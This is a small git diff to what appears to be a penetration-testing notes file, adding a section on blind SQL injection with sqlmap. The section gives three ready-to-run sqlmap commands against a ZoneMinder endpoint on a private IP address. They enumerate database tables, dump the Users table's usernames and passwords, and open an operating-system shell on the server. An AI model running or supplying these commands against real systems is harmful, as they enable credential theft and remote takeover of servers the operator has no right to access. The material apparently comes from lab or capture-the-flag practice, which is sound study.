@@ -35,4 +35,9 @@ show tables;
 select * from table_name;
 ```
 
-Example change
+### Example of blind SQL injection with sqlmap
+```
+sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm --tables --threads 5
+sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm -T Users -C Username,Password --dump --threads 5
+sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell
+```
